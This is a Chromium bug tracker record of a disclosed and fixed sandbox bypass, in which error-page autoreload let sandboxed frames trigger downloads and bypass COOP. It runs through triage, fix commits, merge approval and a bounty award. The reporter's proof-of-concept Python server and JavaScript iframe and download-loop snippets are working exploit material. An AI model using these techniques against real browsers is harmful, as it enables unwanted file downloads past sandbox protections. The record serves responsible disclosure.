# Sandbox bypass "allow-downloads"

| Field | Value |
|-------|-------|
| **Issue ID** | [40060695](https://issues.chromium.org/issues/40060695) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P2 |
| **Component** | Blink>SecurityFeature>IFrameSandbox |
| **Platforms** | Android, Linux, Mac, Windows, ChromeOS |
| **Reporter** | nd...@protonmail.com |
| **Assignee** | ar...@chromium.org |
| **Created** | 2022-08-28 |
| **Bounty** | $3,000.00 |

## Description

**Steps to reproduce the problem:**

1. Run the following Python server that will send an invalid result and then on the next request send a download.  
   
   from http.server import BaseHTTPRequestHandler, HTTPServer

sessions = set()

class handler(BaseHTTPRequestHandler):  

def do\_GET(self):  

if (self.path not in sessions):  

self.send\_response(200)  

self.send\_header("Cache-Control", "no-store")  

message = "<invalid>"  

self.wfile.write(bytes(message, "utf8"))  

self.end\_headers()  

sessions.add(self.path)  

else:  

self.send\_response(200)  

self.send\_header('Cache-Control', 'no-store')  

self.send\_header('Content-Disposition','attachment;filename="file.txt"')  

self.end\_headers()  

message = "file contents"  

self.wfile.write(bytes(message, "utf8"))  

sessions.remove(self.path)

with HTTPServer(('', 8000), handler) as server:  

server.serve\_forever()

2. Create a sand-boxed iframe with allow-popups  
   
   let f = document.createElement('iframe');  
   
   f.sandbox = 'allow-popups';  
   
   f.srcdoc = '<a target="\_blank" href="http://localhost:8000">Click me</a>';  
   
   document.body.appendChild(f);
3. Click the thing that says click me and wait.  
   
   It should open a popup to an error page that then reloads automatically to the download.

**Problem Description:**  

A page reload automatic or otherwise before a popup has finished loading for the first time results in bypassing the download protection of a sandboxed page.  

(Shows new URL but still in old sites process at least no padlock)

Kinda related: <https://crbug.com/chromium/1339639>

**Additional Comments:**

\*\*Chrome version: \*\* 104.0.0.0 \*\*Channel: \*\* Stable

**OS:** Windows

## Timeline

### [Deleted User] (2022-08-28)

[Empty comment from Monorail migration]

### nd...@protonmail.com (2022-08-28)

A page with the Content-Security-Policy: sandbox header will also work without allow-popups
<a href="http://localhost:8000">Click me</a>

The "still in old sites process" part seems to be when you do window.open to a download.

### es...@chromium.org (2022-08-29)

clamy@, could you please help triage? I'm not sure if this is a bug or not; perhaps once you allow a popup, you're allowing breaking out of the iframe sandbox?

[Monorail components: Blink>SecurityFeature>IFrameSandbox]

### [Deleted User] (2022-08-29)

[Empty comment from Monorail migration]

### nd...@protonmail.com (2022-08-30)

Unless allow-popups-to-escape-sandbox is used it should not be possible for a popup to escape the sandbox.
Can also use allow-top-navigation but not needed if its not a iframe.

### cl...@chromium.org (2022-08-30)

@arthursonzogni: can you reproduce?

And yes if we can reproduce, this is indeed a security bug.

### ar...@chromium.org (2022-08-30)

Thanks! This is actually a new and interesting kind of bug.
I can reproduce.

My best guess is that:
- https://chromium-review.googlesource.com/c/chromium/src/+/3735057 caused sandbox not to apply toward Chrome's internal pages. This patch on its own make sense.
- Chrome autoreload when it display some errors pages.
- I know Chrome's auto reload is badly implemented. I remember it initiates the request from the renderer process (from the error page). Somehow, we are initiating the navigation from the "error page" itself. We are badly inheriting the PolicyContainer. This results in a sandbox escape.

+ Antonio FYI. Here is an "interesting" bug FYI. It mixed together some known issues.


(I will have to do some more practical analysis of the issue instead of pure speculations)


If my speculation are right. It might be reproducible only from M105 and M104 is immune to this.

### nd...@protonmail.com (2022-09-25)

Also bypasses the multiple file download restriction :(
for (;;) {
w.location = 'http://localhost:8000';
await new Promise(r => setTimeout(r, 3000));
}

### nd...@protonmail.com (2022-10-02)

This bypasses COOP not sure if its a valid bug but I thought it was interesting :)

from http.server import BaseHTTPRequestHandler, HTTPServer

sessions = set()

class handler(BaseHTTPRequestHandler):
    def do_GET(self):
        if (self.path not in sessions):
            self.send_response(200)
            self.send_header("Cache-Control", "no-store")
            self.send_header('Cross-Origin-Opener-Policy', 'same-origin')
            message = "<invalid>"
            self.wfile.write(bytes(message, "utf8"))
            self.end_headers()
            sessions.add(self.path)
        else:
            self.send_response(200)
            self.send_header('Cross-Origin-Opener-Policy', 'same-origin')
            self.end_headers()
            message = "file contents"
            self.wfile.write(bytes(message, "utf8"))
            sessions.remove(self.path)

with HTTPServer(('', 8000), handler) as server:
    server.serve_forever()

### nd...@protonmail.com (2022-10-02)

(And yes it does work with cross-site redirects)

### nd...@protonmail.com (2022-10-02)

Not sure if "Low" is correct for this.
Seems theirs multiple bugs such as https://crbug.com/chromium/1339639 and https://crbug.com/chromium/1357366#c9 and https://crbug.com/chromium/1357366#c8 and https://crbug.com/chromium/1357366#c0 caused by this behavior.
Should I create separate bugs?

### ar...@google.com (2022-10-03)

Re https://crbug.com/chromium/1357366#c7: (to myself)
> - I know Chrome's auto reload is badly implemented. I remember it initiates the request from the renderer process (from the error page). Somehow, we are initiating the navigation from the "error page" itself. We are badly inheriting the PolicyContainer. This results in a sandbox escape.

It turns out @rockot moved the code to the browser side recently. Thanks! That's was on my wish list for a while ;-)
https://chromium-review.googlesource.com/c/chromium/src/+/2302927

It seems this is still reusing:
```
web_contents()->GetMainFrame()->Reload();
```

I guess this doesn't really tell content/ informations about the initiator of the navigation and we still don't inherit properly sandbox / PolicyContainer.

That's already 90% of the road done before fixing this bug.

---

> Not sure if "Low" is correct for this.

Why?

I don't really know either. I will let the VRP team to decide. There are similar bug like bug like:
https://crbug.com/chromium/1100761: Security: Possible to download files from sandboxed frames

---

> Seems theirs multiple bugs such as https://crbug.com/chromium/1339639 and https://crbug.com/chromium/1357366#c9 and https://crbug.com/chromium/1357366#c8 and https://crbug.com/chromium/1357366#c0 caused by this behavior.
Should I create separate bugs?

No, please don't.
I am not sure about https://crbug.com/chromium/1339639, but https://crbug.com/chromium/1357366#c8 and https://crbug.com/chromium/1357366#c9 would be duplicate.

### nd...@protonmail.com (2022-10-04)

I dont think Low is correct for this bug because its also a COOP bypass and other issues such as:
https://crbug.com/chromium/1256823 and https://crbug.com/chromium/1307087 and for a public example https://crbug.com/chromium/1181673
That got Security_Severity-Medium and this bug has a lot more impact then most of my COOP bugs.


Is the COOP bypass being tracked here or did someone else report it before me?

### aa...@google.com (2022-11-02)

[Empty comment from Monorail migration]

### ar...@google.com (2022-11-02)

Sorry about the delay. I got quite a lot of other equally high priority bug/work to do in the meantime.
I plan to organize a fix-it week very soon this month to book some time for 

About the severity: I will let the "Vulnerability Rewards Program panel" to make a decision. I would like to avoid interfering or provide incorrect expectations. It is not clear to me what is the line in between a low and medium security issues for web feature developers can opt-into.

### aa...@google.com (2022-11-09)

[Empty comment from Monorail migration]

### ar...@google.com (2022-11-22)

+CC @ahemery about https://crbug.com/chromium/1357366#c9

### ah...@chromium.org (2022-11-22)

https://crbug.com/chromium/1357366#c9 issue should be fixed by https://chromium-review.googlesource.com/c/chromium/src/+/4016449

### nd...@protonmail.com (2022-11-22)

Yeah the COOP bypass does seem to fixed in Canary. 
Is it duplicate? 

### ar...@google.com (2022-11-24)

Thanks @ahemery

Yes, https://crbug.com/chromium/1374705 (opened on Oct 14) and what is described in https://crbug.com/chromium/1357366#c9 (opened Oct 2) looks similar to me. I will let a comment on https://crbug.com/chromium/1374705 to the Chrome Vulnerability Reward Program.

This one also originally talked about blocking download, this hasn't been fixed. So we can't merge them.


Summary of what I did recently:
- Added some regression tests. This is not about sandbox flags directly, they are correctly inherited. However this is about different kind of params populated by blink that seem not to be restored after the history restore.

### ar...@google.com (2022-11-25)

Update:
- I have made some regressions tests: https://chromium-review.googlesource.com/c/chromium/src/+/4026243
- I am also working on a fix. Just need some polishing. It should be ready for next week.
- After that, I found so many refactoring opportunities about downloads. Most of what is populated by the renderer process would be done more easily from the browser process, in a better way. Also some unnecessary plumbing: https://chromium-review.googlesource.com/c/chromium/src/+/4056900.

### ar...@chromium.org (2022-11-28)

Update:
pending fix: https://chromium-review.googlesource.com/c/chromium/src/+/4061566

### ar...@google.com (2022-11-28)

[Empty comment from Monorail migration]

### nd...@protonmail.com (2022-11-29)

https://chromium-review.googlesource.com/c/chromium/src/+/4016449 says about using the History API which seems to work better since no longer need allow-popups.

### gi...@appspot.gserviceaccount.com (2022-12-01)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src/+/df084322f09ca909686c21a8578e7cbcf03b0c6a

commit df084322f09ca909686c21a8578e7cbcf03b0c6a
Author: Arthur Sonzogni <arthursonzogni@chromium.org>
Date: Thu Dec 01 09:55:14 2022

Regression test about Chrome autoreloader

Check the navigation is restarted without losing:
- Sandbox flags
- Download policy

Bug: 1357366
Change-Id: I6589cd45eeace6b925ffdd2fa373a08549e061dd
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/4026243
Commit-Queue: Arthur Sonzogni <arthursonzogni@chromium.org>
Reviewed-by: Matt Menke <mmenke@chromium.org>
Reviewed-by: Arthur Sonzogni <arthursonzogni@chromium.org>
Cr-Commit-Position: refs/heads/main@{#1077939}

[add] https://crrev.com/df084322f09ca909686c21a8578e7cbcf03b0c6a/content/test/data/content-disposition-attachment.html.mock-http-headers
[modify] https://crrev.com/df084322f09ca909686c21a8578e7cbcf03b0c6a/components/error_page/content/browser/net_error_auto_reloader_browsertest.cc
[add] https://crrev.com/df084322f09ca909686c21a8578e7cbcf03b0c6a/content/test/data/content-disposition-attachment.html


### gi...@appspot.gserviceaccount.com (2022-12-01)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src/+/6d9f6d732a1a8fe9355872f84fb01cbc7e32d16c

commit 6d9f6d732a1a8fe9355872f84fb01cbc7e32d16c
Author: Kush Sinha <sinhak@chromium.org>
Date: Thu Dec 01 11:58:38 2022

Revert "Regression test about Chrome autoreloader"

This reverts commit df084322f09ca909686c21a8578e7cbcf03b0c6a.

Reason for revert: Multiple build failures. See https://crbug.com/1395023

Original change's description:
> Regression test about Chrome autoreloader
>
> Check the navigation is restarted without losing:
> - Sandbox flags
> - Download policy
>
> Bug: 1357366
> Change-Id: I6589cd45eeace6b925ffdd2fa373a08549e061dd
> Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/4026243
> Commit-Queue: Arthur Sonzogni <arthursonzogni@chromium.org>
> Reviewed-by: Matt Menke <mmenke@chromium.org>
> Reviewed-by: Arthur Sonzogni <arthursonzogni@chromium.org>
> Cr-Commit-Position: refs/heads/main@{#1077939}

Bug: 1357366, 1395023
Change-Id: Ib62a5ac542441021cc7cf46d88abe61d19bd31c6
No-Presubmit: true
No-Tree-Checks: true
No-Try: true
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/4066322
Commit-Queue: Kush Sinha <sinhak@chromium.org>
Owners-Override: Kush Sinha <sinhak@chromium.org>
Bot-Commit: Rubber Stamper <rubber-stamper@appspot.gserviceaccount.com>
Cr-Commit-Position: refs/heads/main@{#1077986}

[delete] https://crrev.com/86a3c1d76c60b7e0a2aedcadc0af1de00ec0bf74/content/test/data/content-disposition-attachment.html.mock-http-headers
[modify] https://crrev.com/6d9f6d732a1a8fe9355872f84fb01cbc7e32d16c/components/error_page/content/browser/net_error_auto_reloader_browsertest.cc
[delete] https://crrev.com/86a3c1d76c60b7e0a2aedcadc0af1de00ec0bf74/content/test/data/content-disposition-attachment.html


### am...@chromium.org (2022-12-02)

[Empty comment from Monorail migration]

### gi...@appspot.gserviceaccount.com (2022-12-05)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src/+/32205169e7612a42a3237e9ffb6e70b8c6d11a37

commit 32205169e7612a42a3237e9ffb6e70b8c6d11a37
Author: Arthur Sonzogni <arthursonzogni@chromium.org>
Date: Mon Dec 05 16:58:44 2022

Reland "Regression test about Chrome autoreloader"

I suspect the problem was that WaitForLoadStop was called without any pending
navigation. In this case, it returns immediately. The fix was to use
TestNavigationManager to wait for a navigation to start and finish.

This reverts commit 6d9f6d732a1a8fe9355872f84fb01cbc7e32d16c.

Original change's description:
> Revert "Regression test about Chrome autoreloader"
>
> This reverts commit df084322f09ca909686c21a8578e7cbcf03b0c6a.
>
> Reason for revert: Multiple build failures. See https://crbug.com/1395023
>
> Original change's description:
> > Regression test about Chrome autoreloader
> >
> > Check the navigation is restarted without losing:
> > - Sandbox flags
> > - Download policy
> >
> > Bug: 1357366
> > Change-Id: I6589cd45eeace6b925ffdd2fa373a08549e061dd
> > Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/4026243
> > Commit-Queue: Arthur Sonzogni <arthursonzogni@chromium.org>
> > Reviewed-by: Matt Menke <mmenke@chromium.org>
> > Reviewed-by: Arthur Sonzogni <arthursonzogni@chromium.org>
> > Cr-Commit-Position: refs/heads/main@{#1077939}
>
> Bug: 1357366, 1395023
> Change-Id: Ib62a5ac542441021cc7cf46d88abe61d19bd31c6
> No-Presubmit: true
> No-Tree-Checks: true
> No-Try: true
> Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/4066322
> Commit-Queue: Kush Sinha <sinhak@chromium.org>
> Owners-Override: Kush Sinha <sinhak@chromium.org>
> Bot-Commit: Rubber Stamper <rubber-stamper@appspot.gserviceaccount.com>
> Cr-Commit-Position: refs/heads/main@{#1077986}

Bug: 1357366, 1395023
Change-Id: I3486959d860499441ba19ecd6e3a45e3a3230a12
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/4075947
Reviewed-by: Matt Menke <mmenke@chromium.org>
Commit-Queue: Arthur Sonzogni <arthursonzogni@chromium.org>
Cr-Commit-Position: refs/heads/main@{#1079266}

[add] https://crrev.com/32205169e7612a42a3237e9ffb6e70b8c6d11a37/content/test/data/content-disposition-attachment.html.mock-http-headers
[modify] https://crrev.com/32205169e7612a42a3237e9ffb6e70b8c6d11a37/components/error_page/content/browser/net_error_auto_reloader_browsertest.cc
[add] https://crrev.com/32205169e7612a42a3237e9ffb6e70b8c6d11a37/content/test/data/content-disposition-attachment.html


### gi...@appspot.gserviceaccount.com (2022-12-06)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src/+/258bee7ca64b1a2193d65f29c8209b2a0898043d

commit 258bee7ca64b1a2193d65f29c8209b2a0898043d
Author: Arthur Sonzogni <arthursonzogni@chromium.org>
Date: Tue Dec 06 18:16:12 2022

Fix NavigationDownloadPolicy from the browser process

The NavigationDownloadPolicy is currently computed by the renderer
process. The problem: not every navigation is initiated from the
renderer. This is a problem.

Most fields from the bitfield can also be computed from the browser
process. This patch computes the one related to the 'allow-download'
sandbox flags from the navigation request. In the future, I believe we
want to do something similar for the other properties.

Bug: 1357366
Change-Id: I0f18d2ff302271745d030494004007aecef1d738
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/4061566
Commit-Queue: Arthur Sonzogni <arthursonzogni@chromium.org>
Reviewed-by: Matt Menke <mmenke@chromium.org>
Reviewed-by: Camille Lamy <clamy@chromium.org>
Cr-Commit-Position: refs/heads/main@{#1079858}

[modify] https://crrev.com/258bee7ca64b1a2193d65f29c8209b2a0898043d/content/public/common/content_features.h
[modify] https://crrev.com/258bee7ca64b1a2193d65f29c8209b2a0898043d/content/browser/renderer_host/navigation_entry_impl.cc
[modify] https://crrev.com/258bee7ca64b1a2193d65f29c8209b2a0898043d/components/error_page/content/browser/net_error_auto_reloader_browsertest.cc
[modify] https://crrev.com/258bee7ca64b1a2193d65f29c8209b2a0898043d/content/browser/renderer_host/navigation_request.cc
[modify] https://crrev.com/258bee7ca64b1a2193d65f29c8209b2a0898043d/content/browser/renderer_host/navigation_request.h
[modify] https://crrev.com/258bee7ca64b1a2193d65f29c8209b2a0898043d/content/public/common/content_features.cc
[modify] https://crrev.com/258bee7ca64b1a2193d65f29c8209b2a0898043d/components/error_page/content/browser/DEPS


### ar...@chromium.org (2022-12-08)

This has been fixed. I confirmed on the latest builds released.
@ndevtk@ could you confirm?



### [Deleted User] (2022-12-08)

Merge review required: a commit with DEPS changes was detected.

Please answer the following questions so that we can safely process your merge request:
1. Why does your merge fit within the merge criteria for these milestones?
- Chrome Browser: https://chromiumdash.appspot.com/branches
- Chrome OS: https://goto.google.com/cros-release-branch-merge-guidelines
2. What changes specifically would you like to merge? Please link to Gerrit.
3. Have the changes been released and tested on canary?
4. Is this a new feature? If yes, is it behind a Finch flag and are experiments active in any release channels?
5. [Chrome OS only]: Was the change reviewed and approved by the Eng Prod Representative? https://goto.google.com/cros-engprodcomponents
6. If this merge addresses a major issue in the stable channel, does it require manual verification by the test team? If so, please describe required testing.

Please contact the milestone owner if you have questions.
Owners: govind (Android), eakpobaro (iOS), matthewjoseph (ChromeOS), pbommana (Desktop)

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ar...@chromium.org (2022-12-08)

> Merge review required: a commit with DEPS changes was detected.

Not really. The fix is behind a kill switch. The DEPS was about allowing checking for it in the regression test. The regression test landed separately. So the cherry-picked patch do not touch the DEPS file anymore.

See the patch: https://chromium-review.googlesource.com/c/chromium/src/+/4085032

> Please answer the following questions so that we can safely process your merge request:
> 1. Why does your merge fit within the merge criteria for these milestones?
> - Chrome Browser: https://chromiumdash.appspot.com/branches

This is fixing a ~security issue: bypassing allow-download.

> 2. What changes specifically would you like to merge? Please link to Gerrit.

The cherry-pick is: https://chromium-review.googlesource.com/c/chromium/src/+/4085032

> 3. Have the changes been released and tested on canary?

Yes. I also tested the official canary build:
https://pantheon.corp.google.com/storage/browser/_details/chrome-unsigned/desktop-5c0tCh/110.0.5465.0/linux64/chrome-linux64.zip;tab=live_object

> 4. Is this a new feature? If yes, is it behind a Finch flag and are experiments active in any release channels?

No, this is not a new feature.

> 6. If this merge addresses a major issue in the stable channel, does it require manual verification by the test team? If so, > please describe required testing.

No


### [Deleted User] (2022-12-08)

[Empty comment from Monorail migration]

### am...@chromium.org (2022-12-09)

Fixes for low severity bugs do not get backmerged, however reviewing this issue and the fix, this issue seems to be sufficiently more serious than originally expected and triaged. Adjusting severity to medium and keeping issue in merge review queue. 

Just a quick note in ref to comments #13 and #15, security severity is not part of the VRP process. While VRP may adjust severity based on assessment and analysis, severity assignment (or adjustment) should very much occur before VRP as it drives triage, prioritization, and security merge review processes as well. Please always feel free to reach out if a severity reassessment is needed from security or we can help answer any questions about severity or other outcomes of security triage. Thanks! 

### am...@chromium.org (2022-12-09)

I accidentally removed the merge review label; if sheriffbot reposts the questionnaire, please ignore it

### [Deleted User] (2022-12-09)

Setting Pri-1 to match security severity Medium. If this is incorrect, please reset the priority. Sheriffbot won't make this change again.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2022-12-09)

[Empty comment from Monorail migration]

### nd...@protonmail.com (2022-12-10)

Fix seems to be working, you can still do ctrl or middle mouse button click a link to trigger a download not sure if that's intentional.

### ar...@chromium.org (2022-12-12)

> Fix seems to be working, you can still do ctrl or middle mouse button click a link to trigger a download not sure if that's intentional.

Thanks!

----

ctrl/middle/contextual-menu navigation initiated by the the user are intentionally not considered to be part of it. They should behave 'as-if' the user copy and pasted the URL into a new tab.

> Just a quick note in ref to comments #13 and #15, security severity is not part of the VRP process. While VRP may adjust severity based on assessment and analysis, severity assignment (or adjustment) should very much occur before VRP as it drives triage, prioritization, and security merge review processes as well. Please always feel free to reach out if a severity reassessment is needed from security or we can help answer any questions about severity or other outcomes of security triage. Thanks!

Noted! Thanks!

---

I am still waiting for a merge-approval for https://chromium-review.googlesource.com/c/chromium/src/+/4085032

### am...@chromium.org (2022-12-12)

yes, thanks -- we were prioritizing M108 merges last week given the RC cut deadline on Friday and also felt like this would wouldn't hurt to have extra bake/test time for :) 

M109 merge approved for https://ccrev.com/c/4085032 please merge this fix to branch 5414 at your earliest convenience and before 3pm Pacific tomorrow (Tuesday) 13 December so this fix can be included in the next M109/beta -- thank you! 

### pb...@google.com (2022-12-13)

Your merge has been approved for M109, please help complete your merges asap (before 2pm PST) today, so the change can be included in this week's RC build for beta releases.

We would like to get the changes as much beta time as possible, so please complete your merges asap to M109 branch(go/chrome-branches).

### gi...@appspot.gserviceaccount.com (2022-12-14)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src/+/4fe4ca767a33dc8289b6d40a6c1d37a8654245ac

commit 4fe4ca767a33dc8289b6d40a6c1d37a8654245ac
Author: Arthur Sonzogni <arthursonzogni@chromium.org>
Date: Wed Dec 14 10:50:15 2022

[M109] Fix NavigationDownloadPolicy from the browser process

The NavigationDownloadPolicy is currently computed by the renderer
process. The problem: not every navigation is initiated from the
renderer. This is a problem.

Most fields from the bitfield can also be computed from the browser
process. This patch computes the one related to the 'allow-download'
sandbox flags from the navigation request. In the future, I believe we
want to do something similar for the other properties.

(cherry picked from commit 258bee7ca64b1a2193d65f29c8209b2a0898043d)

Bug: 1357366
Change-Id: I0f18d2ff302271745d030494004007aecef1d738
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/4061566
Commit-Queue: Arthur Sonzogni <arthursonzogni@chromium.org>
Reviewed-by: Matt Menke <mmenke@chromium.org>
Reviewed-by: Camille Lamy <clamy@chromium.org>
Cr-Original-Commit-Position: refs/heads/main@{#1079858}
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/4085032
Auto-Submit: Arthur Sonzogni <arthursonzogni@chromium.org>
Cr-Commit-Position: refs/branch-heads/5414@{#718}
Cr-Branched-From: 4417ee59d7bf6df7a9c9ea28f7722d2ee6203413-refs/heads/main@{#1070088}

[modify] https://crrev.com/4fe4ca767a33dc8289b6d40a6c1d37a8654245ac/content/public/common/content_features.h
[modify] https://crrev.com/4fe4ca767a33dc8289b6d40a6c1d37a8654245ac/content/browser/renderer_host/navigation_entry_impl.cc
[modify] https://crrev.com/4fe4ca767a33dc8289b6d40a6c1d37a8654245ac/content/browser/renderer_host/navigation_request.cc
[modify] https://crrev.com/4fe4ca767a33dc8289b6d40a6c1d37a8654245ac/content/browser/renderer_host/navigation_request.h
[modify] https://crrev.com/4fe4ca767a33dc8289b6d40a6c1d37a8654245ac/content/public/common/content_features.cc


### am...@google.com (2022-12-15)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.
******************************

### am...@chromium.org (2022-12-16)

Congratulations! The VRP Panel has decided to award you $3,000 for this report. Thank you for your efforts in discovering and reporting this issue to us! 

### nd...@protonmail.com (2022-12-16)

Is that including the COOP bypass? reward is the same as https://bugs.chromium.org/p/chromium/issues/detail?id=1100761 which looks like is not a coop bypass and maybe requires user activation.

### am...@google.com (2022-12-16)

[Empty comment from Monorail migration]

### dd...@google.com (2023-01-04)

[Empty comment from Monorail migration]

### am...@chromium.org (2023-01-09)

[Empty comment from Monorail migration]

### am...@google.com (2023-01-10)

[Empty comment from Monorail migration]

### pg...@google.com (2023-01-10)

[Empty comment from Monorail migration]

### [Deleted User] (2023-03-16)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### gi...@appspot.gserviceaccount.com (2023-03-17)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src/+/f682676e54474e2f32e9c6dde2b9e7f5470c3a8b

commit f682676e54474e2f32e9c6dde2b9e7f5470c3a8b
Author: Dominic Farolino <dom@chromium.org>
Date: Fri Mar 17 20:57:56 2023

Remove the kBrowserSideDownloadPolicySandbox feature

It was meant to be removed in M111, but lingered past then. This CL
removes it as a clean-up.

R=arthursonzogni@chromium.org

Bug: 1357366
Change-Id: I265865f76fef8b8ea24ad75d176f17a611820f8f
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/4345437
Auto-Submit: Dominic Farolino <dom@chromium.org>
Reviewed-by: Arthur Sonzogni <arthursonzogni@chromium.org>
Commit-Queue: Matt Menke <mmenke@chromium.org>
Reviewed-by: Matt Menke <mmenke@chromium.org>
Cr-Commit-Position: refs/heads/main@{#1118870}

[modify] https://crrev.com/f682676e54474e2f32e9c6dde2b9e7f5470c3a8b/content/public/common/content_features.h
[modify] https://crrev.com/f682676e54474e2f32e9c6dde2b9e7f5470c3a8b/components/error_page/content/browser/net_error_auto_reloader_browsertest.cc
[modify] https://crrev.com/f682676e54474e2f32e9c6dde2b9e7f5470c3a8b/content/browser/renderer_host/navigation_request.cc
[modify] https://crrev.com/f682676e54474e2f32e9c6dde2b9e7f5470c3a8b/content/public/common/content_features.cc


### am...@chromium.org (2023-10-08)

[Empty comment from Monorail migration]

### is...@google.com (2023-10-08)

This issue was migrated from crbug.com/chromium/1357366?no_tracker_redirect=1

[Monorail mergedwith: crbug.com/chromium/1373758, crbug.com/chromium/1374705]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40060695)*
